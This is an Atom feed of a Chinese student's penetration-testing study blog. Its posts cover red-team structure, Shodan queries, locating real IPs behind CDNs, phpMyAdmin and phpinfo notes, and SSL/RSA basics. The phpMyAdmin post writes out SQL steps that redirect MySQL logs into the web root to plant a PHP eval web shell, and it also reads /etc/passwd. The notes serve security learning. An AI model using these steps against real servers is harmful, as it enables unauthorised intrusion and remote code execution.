<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Morn-zh.github.io</id>
    <title>Morn-zh</title>
    <updated>2021-05-13T12:10:43.941Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Morn-zh.github.io"/>
    <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
    <subtitle>我等着，等着你</subtitle>
    <logo>https://Morn-zh.github.io/images/avatar.png</logo>
    <icon>https://Morn-zh.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Morn-zh</rights>
    <entry>
        <title type="html"><![CDATA[我眼中的红队（转载）]]></title>
        <id>https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/</id>
        <link href="https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/">
        </link>
        <updated>2021-05-12T10:38:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="我眼中的红队">我眼中的红队</h1>
<p>仅聊一聊我自己眼中的红队，如有异议请指教。</p>
<p>作者：林晨</p>
<h2 id="关于红队">关于红队</h2>
<p>红队：通常指攻防演习中的攻击方</p>
<h2 id="红队评估">红队评估</h2>
<p>在聊红队结构的组成之前我们需要了解红队评估的简单流程和技术手段。</p>
<h3 id="红队评估流程">红队评估流程</h3>
<p>1.打点：通过弱口令、文件上传、命令执行、社工等技术手段对Web、App、IoT等一切暴露在互联网的服务和个人PC等防守方内部机器进行外部攻击，并尝试获取内网入口权限也就是当前被攻击服务所在系统的权限；</p>
<p>2.横向：获取到内网入口权限后对当前主机的开放端口、运行进程、配置密码、内网网段、域等一切有价值的信息进行收集，并对收集到的信息进行分析、关联、整合并结合相关的技术手段进一步的对内网主机进行漏洞发现、权限和数据获取等操作；</p>
<p>3.报告：将红队评估过程中所涉技术手段、安全风险、所涉单位等信息进行梳理，整合成文档报告用于项目交付和复盘总结。</p>
<h2 id="红队结构">红队结构</h2>
<p>在一般的攻防演习活动中所需的红队人员数为三人，三人分别是：队长、渗透师、横向师。</p>
<p>红队人员都应涉及较为全面的技术领域，除此之外可以细分三人的技术领域和应有的能力。</p>
<p>队长：技术综合能力较强，应具备较好的团队协作能力、组织能力、应变能力；</p>
<p>渗透师：前渗透能力较强，在演习过程中需能“稳、狠、准、快”的寻找到边界点并进行突破（打点）；</p>
<p>横向师：后渗透能力较强，根据渗透师的打点结果进行梳理，横向渗透其他内网服务和主机，全面的评估内网的安全体系。</p>
<h2 id="红队建设">红队建设</h2>
<p>建立一支优秀的红队所需：人员、武器库、漏洞库</p>
<p>1.人员：招聘、公司内部转换、人才培养；</p>
<p>2.武器库建设：将红队评估参与的人员比喻成一线，那么建设武器库的人员就是二线，二线人员不需要直接参与到红队评估中，但需要起到支撑作用；例如将一线人员的需求进行工具、脚本化的转变；</p>
<p>3.漏洞库建设：同上所述漏洞库的建设也离不开人员，除了红队评估人员自我产出的通用漏洞积累除外，还需要一批专门做漏洞研究的人员作为二线进行漏洞研究，以便于一线评估人员更“快速”的进行攻防。</p>
<h3 id="准备工作">准备工作</h3>
<p>协作平台<br>
俗话说的好“三个臭皮匠顶一个诸葛亮”，红队评估这件事情从来都不是一个人的“战斗”，它需要团队协作共同完成。</p>
<p>每个红队成员都有自己较为熟悉的技术领域，这也就导致了每个人所“打”的点和所“看”的面不同，要想全面的进行评估工作就需要协作平台将每个人的信息进行汇总便于每个人都能接触到“不同面”的信息。</p>
<h3 id="协作平台的推荐">协作平台的推荐：</h3>
<p>1.Codimd - https://github.com/hackmdio/codimd （Markdown文档协作平台）</p>
<p>2.CobaltStrike - https://www.cobaltstrike.com （后渗透团队协作平台）</p>
<h3 id="成员">成员</h3>
<p>1.队长：与主办方沟通了解比赛时间、比赛规则，有时可针对“规则漏洞”制定攻击方案；搭建所需的协作平台；</p>
<p>2.渗透师：应将前渗透中的通用技术手段（外网开放端口、服务弱口令扫描、信息泄露）转换为工具进行一键批量自动化，也可在规则允许的情况下准备对应的扫描器（通常目标几百、上千个的情况下没有精力一个一个的手工查看）；</p>
<p>3.横向师：应将内网的弱口令扫描、端口扫描、高危漏洞扫描等操作转换为工具进行一键批量自动化，避免在后期的横向中浪费大量的不必要时间。</p>
<p>转载自：https://gh0st.cn/archives/2019-09-21/1</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集之shodan]]></title>
        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/</id>
        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/">
        </link>
        <updated>2021-05-09T14:53:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="信息收集之shodan">信息收集之shodan</h1>
<p>shodan音译就是撒旦，一个用来搜索在线设备的搜索引擎</p>
<p>shodan有3个使用方式，一个是直接网页访问，一个是命令行，一个是python代码中引用</p>
<h2 id="网页版">网页版</h2>
<p>网址：https://www.shodan.io/</p>
<p>现在想要搜索需要后才能使用，并且普通用户有搜索条数的限制</p>
<h3 id="常见过滤命令">常见过滤命令</h3>
<ul>
<li><code>hostname</code>：搜索指定的主机或域名，例如 <code>hostname:&quot;google&quot;</code></li>
<li><code>port</code>：搜索指定的端口或服务，例如 <code>port:&quot;21&quot;</code></li>
<li><code>country</code>：搜索指定的国家，例如 <code>country:&quot;CN&quot;</code></li>
<li><code>city</code>：搜索指定的城市，例如 <code>city:&quot;Hefei&quot;</code></li>
<li><code>org</code>：搜索指定的组织或公司，例如 <code>org:&quot;google&quot;</code></li>
<li><code>isp</code>：搜索指定的ISP供应商，例如 <code>isp:&quot;China Telecom&quot;</code></li>
<li><code>product</code>：搜索指定的操作系统/软件/平台，例如 <code>product:&quot;Apache httpd&quot;</code></li>
<li><code>version</code>：搜索指定的软件版本，例如 <code>version:&quot;1.6.2&quot;</code></li>
<li><code>geo</code>：搜索指定的地理位置，参数为经纬度，例如 <code>geo:&quot;31.8639, 117.2808&quot;</code></li>
<li><code>before/after</code>：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 <code>before:&quot;11-11-15&quot;</code></li>
<li><code>net</code>：搜索指定的IP地址或子网，例如 <code>net:&quot;210.45.240.0/24&quot;</code></li>
</ul>
<h3 id="实例">实例</h3>
<p>查找位于合肥的 Apache 服务器：</p>
<pre><code>apache city:&quot;Hefei&quot;
</code></pre>
<p>查找位于国内的 Nginx 服务器：</p>
<pre><code>nginx country:&quot;CN&quot;
</code></pre>
<p>查找 GWS(Google Web Server) 服务器：</p>
<pre><code>&quot;Server: gws&quot; hostname:&quot;google&quot;
</code></pre>
<p>查找指定网段的华为设备：</p>
<pre><code>huawei net:&quot;61.191.146.0/24&quot;
</code></pre>
<h2 id="命令行">命令行</h2>
<p>安装</p>
<pre><code>pip install shodan
</code></pre>
<p>初始化</p>
<pre><code>shodan init [api_key]
</code></pre>
<p><code>api_key</code>注册后就会分配，在账户中进行查看</p>
<h3 id="语法说明">语法说明</h3>
<pre><code>shodan -h
</code></pre>
<pre><code>Usage: shodan [OPTIONS] COMMAND [ARGS]...

Options:
  -h, --help  Show this message and exit.

Commands:
  alert       Manage the network alerts for your account
  convert     Convert the given input data file into a different format.
  count       Returns the number of results for a search
  data        Bulk data access to Shodan
  domain      View all available information for a domain
  download    Download search results and save them in a compressed JSON...
  honeyscore  Check whether the IP is a honeypot or not.
  host        View all available information for an IP address
  info        Shows general information about your account
  init        Initialize the Shodan command-line
  myip        Print your external IP address
  org         Manage your organization's access to Shodan
  parse       Extract information out of compressed JSON files.
  radar       Real-Time Map of some results as Shodan finds them.
  scan        Scan an IP/ netblock using Shodan.
  search      Search the Shodan database
  stats       Provide summary information about a search query
  stream      Stream data in real-time.
  version     Print version of this tool.
</code></pre>
<h3 id="search查找">search查找</h3>
<p>直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据</p>
<pre><code>shodan search microsoft iis 6.0
</code></pre>
<pre><code>shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0
</code></pre>
<p>内容多的话就敲回车慢慢看，似乎有更简便的方法，但是不会（</p>
<p>不想看了，退出按q即可</p>
<h3 id="host信息">host信息</h3>
<p>查找host的相关信息</p>
<pre><code>shodan host 52.47.198.62
</code></pre>
<p>感觉不太准，有的端口无法被扫描出来</p>
<h2 id="python代码">python代码</h2>
<p>示例</p>
<pre><code>import shodan  # 导入shodan库

api = shodan.Shodan(&quot;xxxxxxxxxxx&quot;)  # 指定API_KEY,返回句柄
try:
    results = api.search('apache')  # 搜索apache，返回 JSON格式的数据
    print(results)
    print(&quot;Results found:%s&quot; % results['total'])
    for result in results['matches']:
        print(result['ip_str'])  # 打印出ip地址
except shodan.APIError as e:
    # print(&quot;Error:%s&quot; % e)
    pass
</code></pre>
<p>小tips</p>
<p>查看自身外部可见ip</p>
<pre><code>shodan myip
</code></pre>
<p>查看是否为蜜罐</p>
<pre><code>shodan honeyscore xx.xx.xx.xx
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[绕过CDN查找真实IP]]></title>
        <id>https://Morn-zh.github.io/post/rao-guo-cdn-cha-zhao-zhen-shi-ip/</id>
        <link href="https://Morn-zh.github.io/post/rao-guo-cdn-cha-zhao-zhen-shi-ip/">
        </link>
        <updated>2021-05-09T14:52:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="绕过cdn查找真实ip">绕过CDN查找真实IP</h1>
<p>CDN的全称是 Content Delivery Network，即内容分发网络</p>
<p>开启CDN后，网站会根据用户所处的位置，让用户访问邻近的CND服务器，避免直接访问主站，减少网站服务器宽带资源,降低服务器压力。</p>
<p>所以会出现，不同地区ping百度,不同地区得到的反馈ip不一样的情形。</p>
<p>（我可以理解是镜像吗？</p>
<h2 id="验证是否使用cdn">验证是否使用CDN</h2>
<h3 id="使用多地ping服务">使用多地ping服务</h3>
<pre><code>http://ping.chinaz.com/
http://ping.aizhan.com/
http://ce.cloud.360.cn/
https://www.17ce.com/
</code></pre>
<h3 id="使用nslookup检测">使用nslookup检测</h3>
<p>如果返回域名解析对应多个 IP 地址多半是使用了 CDN。</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/Snipaste_2021-05-07_21-41-45.png" alt="Snipaste_2021-05-07_21-41-45" loading="lazy"></figure>
<h2 id="如何绕过cdn找到目标站点真实ip">如何绕过CDN找到目标站点真实IP？</h2>
<h3 id="让服务器主动连接我们">让服务器主动连接我们</h3>
<p>方法有</p>
<ul>
<li>让它发邮件给我们，我们查看邮件源代码，可以看到目标IP</li>
<li>RSS邮件订阅（？</li>
<li>利用网站漏洞：比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</li>
</ul>
<h3 id="查询dns历史记录">查询DNS历史记录</h3>
<p>查询网站</p>
<p>微步社区 https://x.threatbook.cn/（允许的查询次数少）</p>
<p>ipip整合不同的地区的信息：https://tools.ipip.net/cdn.php</p>
<p>国外的查询网站：</p>
<p>http://toolbar.netcraft.com/site_report?url=</p>
<p>https://viewdns.info/</p>
<p>https://securitytrails.com/（推荐）</p>
<h3 id="查询子域名">查询子域名</h3>
<p>通过子站点（可能没有CDN），查询对应IP，从而辅助查找目标真实IP</p>
<p>使用子域名扫描器、谷歌搜索都可</p>
<h3 id="网络空间搜索引擎">网络空间搜索引擎</h3>
<p>1、钟馗之眼：https://www.zoomeye.org/</p>
<p>2、Shodan：https://www.shodan.io/</p>
<p>3、FOFA：https://fofa.so/</p>
<h3 id="通过ssl证书">通过SSL证书</h3>
<blockquote>
<p>摘自：https://www.hackliu.com/?p=448</p>
</blockquote>
<p>假如你在xyz123boot.com上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。</p>
<blockquote>
<p><strong>Cloudflare</strong>（<a href="https://zh.wikipedia.org/wiki/%E7%BA%BD%E7%BA%A6%E8%AF%81%E5%88%B8%E4%BA%A4%E6%98%93%E6%89%80">NYSE</a>：<a href="http://www.nyse.com/quote/XNYS:NET">NET</a>）是一家总部位于<a href="https://zh.wikipedia.org/wiki/%E8%88%8A%E9%87%91%E5%B1%B1">旧金山</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9C%8B">美国</a>跨国科技企业，以向客户提供基于<a href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理</a>的<a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF">内容分发网络</a>（Content Delivery Network, CDN）及<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">分布式域名解析服务</a>（Distributed Domain Name Server）为主要业务。</p>
</blockquote>
<p>这看起来很安全，但问题是，当你在端口443（https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。</p>
<p>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在xyz123boot.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<blockquote>
<p>Censys：https://censys.io/</p>
</blockquote>
<p>目前Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。</p>
<p>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
<p>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。</p>
<p>xyz123boot.com证书的搜索查询参数为：parsed.names：xyz123boot.com</p>
<p>只显示有效证书的查询参数为：tags.raw：trusted</p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>组合后的搜索参数为：parsed.names: xyz123boot.com and tags.raw: trusted</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276469987432.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>Censys将向你显示符合上述搜索条件的所有标准证书，以上这些证书是在扫描中找到的。</p>
<p>要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What's using this certificate? &gt; IPv4 Hosts</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276494363607.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>此时，攻击者将看到一个使用特定证书的IPv4主机列表，而真实原始 IP就藏在其中。</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276514702250.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>你可以通过导航到端口443上的IP来验证，看它是否重定向到xyz123boot.com，或它是否直接在IP上显示网站？</p>
<p>使用给定的SSL证书</p>
<p>如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。做好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4主机，只需将&quot;SHA1 fingerprint&quot;（签名证书的sha1值）粘贴到Censys IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器。</p>
<blockquote>
<p>这里有个疑问，既然在网上有办法找到签名证书的sha1，也能对应到某个IP，是不是每个人都是裸奔上网？</p>
</blockquote>
<h3 id="检索header信息">检索header信息</h3>
<p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :</p>
<p>查找由CloudFlare提供服务的网站的参数如下：</p>
<p>80.http.get.headers.server:cloudflare</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276536427745.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<h3 id="利用响应中信息">利用响应中信息</h3>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<p>ga（'create'，'UA-93577176-1'，'auto'）;<br>
可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<p>搜索示例：https://www.shodan.io/search?query=http.html%3AUA-32023260-1</p>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP/1559276559939859.png" alt="1058583-20181009230838766-860479177.png" loading="lazy"></figure>
<p>在JS⽂件中寻找敏感接⼝：</p>
<blockquote>
<p>https://github.com/Threezh1/JSFinder</p>
<p>https://github.com/GerbenJavado/LinkFinder</p>
</blockquote>
<h3 id="使用国外主机解析域名">使用国外主机解析域名</h3>
<p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<h3 id=""></h3>
<h3 id="网站漏洞查找">网站漏洞查找</h3>
<p>1）目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br>
2）XSS盲打，命令执行反弹shell，SSRF等。<br>
3）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h3 id="用-zmap-扫全网">用 Zmap 扫全网</h3>
<p>（未实践</p>
<pre><code>wget http://www.ipdeny.com/ipblocks/data/countries/hk.zone #香港IP 
zmap -w hk.zone -p 80 -B 100M -o hk.res
./zgrab -input-file=hk.res -senders=2000 -data-&quot;./http-reg&quot; | grep -E 'memberlogin' &gt;&gt; x.txt
</code></pre>
<pre><code>wget -c http://ftp.apnic.net/stats/apnic/delegated-apnic-latest #全网IP,天朝好像扫不到
</code></pre>
<h3 id="-2"></h3>
<h3 id="f5-ltm解码法">F5 LTM解码法</h3>
<p>（看不懂</p>
<p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<p>（难道是通过某种类型的cookie中暴露的信息得出IP</p>
<p>https://www.fujieace.com/penetration-test/cdn-find-ip.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集]]></title>
        <id>https://Morn-zh.github.io/post/xin-xi-shou-ji/</id>
        <link href="https://Morn-zh.github.io/post/xin-xi-shou-ji/">
        </link>
        <updated>2021-05-06T12:47:52.000Z</updated>
        <content type="html"><![CDATA[<p>挖坑中。。。</p>
<h1 id="shodan">Shodan</h1>
<h1 id="oneforall">oneforall</h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[phpMyAdmin随记]]></title>
        <id>https://Morn-zh.github.io/post/phpmyadmin-sui-ji/</id>
        <link href="https://Morn-zh.github.io/post/phpmyadmin-sui-ji/">
        </link>
        <updated>2021-04-29T14:08:46.000Z</updated>
        <content type="html"><![CDATA[<p>版本：phpMyAdmin4.8.5</p>
<p>查阅版本信息：</p>
<p>http://localhost/phpMyAdmin4.8.5/README<br>
http://localhost/phpMyAdmin4.8.5/changelog.php</p>
<h1 id="常规getshell">常规getshell</h1>
<p>1.可以看看网站是否存在注入利用注入出来的账号密码登录（x<br>
2.使用phpmyadmin爆破工具进行爆破进入后台（x</p>
<p>查找物理路径</p>
<p>phpinfo.php</p>
<pre><code>select @@basedir;
</code></pre>
<pre><code>web绝对路径：在可读写的前提下如何获取web路径？

(1) phpinfo() 页面：最理想的情况，直接显示web路径

(2) web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径

(3) 一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以通过查看数据库路径show variables like '%datadir%'; ，再猜解web路径的方法，一般容易成功。

(4) 利用select load_file() 读取文件找到web路径：可以尝试/etc/passwd，apache|nginx|httpd log之类的文件。

Trick：如何判断目录是否存在，往往确定了/var/www/html目录，但是还有一层目录不能确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用select 'test' into outfile '/var/www/$fuzz$/shell.php';时目录$fuzz$不存在将会报错Can't create/write to file '/var/www/html/.666.txt' (Errcode: 2)；如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的load data infile &quot;/etc/passwd&quot; into table test;该语句执行后将也会显示文件是否存在，有权限能否写等信息。

</code></pre>
<p>查看写入权限</p>
<pre><code>show variables like '%secure%'
</code></pre>
<pre><code>select 'test' into outfile '/var/www/webxxx/shell.php'
</code></pre>
<h1 id="日志getshell">日志getshell</h1>
<h2 id="写入日志文件getshell">写入日志文件getshell</h2>
<p>查看日志设置</p>
<pre><code>show variables like 'general_log%'
</code></pre>
<pre><code>第一步手动开启日志。
set global  general_log='on'   //首先设置为on
第二步 修改日志路径
set global  general_log_file =&quot;d:\\phpstudy\\www\\a.php&quot;
然后 查看是否开启成功
show variables like &quot;general_log%&quot;
</code></pre>
<pre><code>然后只要执行的语句都会写入到日志文件中，所以我们查询语句
select '&lt;?php eval($_POST['a']);?&gt;'
虽然报错但已经写进去了
</code></pre>
<h2 id="慢查询写入webshell">慢查询写入webshell</h2>
<p>查询配置</p>
<pre><code>show variables like '%slow%';
</code></pre>
<p>配置路径</p>
<pre><code>set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
</code></pre>
<p>开启</p>
<pre><code>set GLOBAL slow_query_log=on;
</code></pre>
<p>写入日志</p>
<pre><code>select '&lt;?php phpinfo();?&gt;' from mysql.db where sleep(10);
</code></pre>
<p>参考文章：</p>
<p>https://www.cnblogs.com/xhcbj/p/13356580.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[phpinfo中值得注意的点]]></title>
        <id>https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/</id>
        <link href="https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/">
        </link>
        <updated>2021-04-27T13:13:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="如何获取phpinfo页面">如何获取phpinfo页面</h2>
<ul>
<li>扫描器</li>
<li>Google Hacking</li>
<li>⽹站⾃有功能</li>
<li>同个服务器的其他站（旁站）</li>
</ul>
<h2 id="需要注意的参数">需要注意的参数</h2>
<ul>
<li>
<p>System</p>
<p>目标机器的操作系统</p>
</li>
<li>
<p>_ENV[&quot;SCRIPT_FILENAME&quot;]</p>
<p>网站物理路径</p>
</li>
<li>
<p>_SERVER[&quot;SERVER_ADDR&quot;]</p>
<p>目标服务器的真实IP</p>
</li>
<li>
<p>_SERVER[&quot;SERVER_SOFTWARE&quot;]</p>
<p>目标服务器的Web服务器版本</p>
</li>
<li>
<p>allow_url_include</p>
<p>远程包含</p>
<p><a href="https://blog.csdn.net/sunjikui1255326447/article/details/106974354/">什么是远程包含？</a></p>
</li>
<li>
<p>disable_functions</p>
<p>查看禁用函数</p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">PHP disable_functions Bypass 的方法探究 - Tr0y's Blog</a></p>
</li>
</ul>
<p>php 下能够执行系统命令的函数有哪些？</p>
<pre><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)
Copy
</code></pre>
<p>那么 便可以看看 php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可</p>
<p>待看文章：</p>
<p>php的笔记学习：https://www.kancloud.cn/a173512/php_note/1690470</p>
<p>绕过disable_functions：https://www.meetsec.cn/（有点难啃，后续得查看下相关的资料）</p>
<p>windows下cmd命令：https://www.jb51.net/article/141568.htm</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SSL+面试小结]]></title>
        <id>https://Morn-zh.github.io/post/rsa-jia-mi-qian-ming-guo-cheng/</id>
        <link href="https://Morn-zh.github.io/post/rsa-jia-mi-qian-ming-guo-cheng/">
        </link>
        <updated>2021-04-27T08:34:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ssl">SSL</h1>
<p>安全套接层，https协议的重要组成部分<br>
以下几篇文章配合阅读，写的比我更好、更详细</p>
<p>SSL单向验证：https://blog.csdn.net/sarafina527/article/details/89333536?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-9&amp;spm=1001.2101.3001.4242</p>
<p>HTTPS过程：https://www.cnblogs.com/xtiger/p/11026870.html<br>
SSL双向验证：https://blog.csdn.net/jingzi123456789/article/details/81020747</p>
<p>全过程图解：https://blog.csdn.net/u011779724/article/details/80776776<br>
HTTPS篇之SSL握手过程详解：https://blog.csdn.net/kunyus/article/details/98754475?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;dist_request_id=1619765853125_25768&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control（推荐）<br>
计网小结：https://blog.csdn.net/u010858605/article/details/113686420（推荐）</p>
<p><strong>SSL/TLS握手方式有两种，一种基于RSA，一种基于Diffie-Hellman。</strong></p>
<h2 id="rsa">RSA</h2>
<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20190807155642447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1bnl1cw==,size_16,color_FFFFFF,t_70" alt="" loading="lazy"></figure>
<h2 id="dh">DH</h2>
<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/20190807160033447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1bnl1cw==,size_16,color_FFFFFF,t_70" alt="" loading="lazy"></figure>
<h1 id="https通信过程">HTTPS通信过程</h1>
<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/20210210085413553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA4NTg2MDU=,size_16,color_FFFFFF,t_70" alt="" loading="lazy"></figure>
<h1 id="rsa加密签名过程">RSA加密/签名过程</h1>
<h2 id="加密-签名的目的">加密、签名的目的</h2>
<p>加密的目的：保证自己发出的东西，只有收件方才能破解</p>
<p>签名的目的：向收件方证明这东西是自己发的（以及防重放、防篡改、防抵赖、防伪造）</p>
<p>加密、解密过程用到的算法：加密算法、解密算法<br>
签名、验签过程用到的算法：签名算法、验签算法</p>
<p>加密和签名是<strong>两个过程</strong>，可以配合使用</p>
<h2 id="加密配合签名进行消息传输的完成过程">加密配合签名进行消息传输的完成过程</h2>
<p>前提：双方都有各自的公私钥（<strong>两套</strong>不同的公私钥组合），并且通过前期的通信拥有对方的公钥。</p>
<p>加密/解密和签名/验签完整过程:<br>
A--&gt;B（A发送给B）</p>
<p>1、A用hash算法对待发内容<code>content</code>生成摘要<code>summary</code><br>
2、A用自己的私钥<code>secret_key_A</code>对摘要<code>summary</code>进行签名得到签名<code>signature</code><br>
3、A使用B的公钥<code>public_key_B</code>对（签名<code>signature</code>+待发内容<code>content</code>）进行加密得到密文<code>encrypted_string</code><br>
4、A将密文<code>encrypted_string</code>发送给B</p>
<p>5、B接收到密文<code>encrypted_string</code>，使用自己的私钥<code>secret_key_B</code>进行解密，分离出签名<code>signature</code>、接收内容<code>content</code><br>
6、B用A的公钥<code>public_key_A</code>解密签名<code>signature</code>得到摘要1<code>summary_1</code><br>
7、B用同样的hash算法对接收内容<code>content</code>生成摘要2<code>summary_2</code><br>
8、B对比摘要1和摘要2是否相等，相等即验证了消息是A发的并且传输的过程中为被篡改或伪造</p>
<p>图解<br>
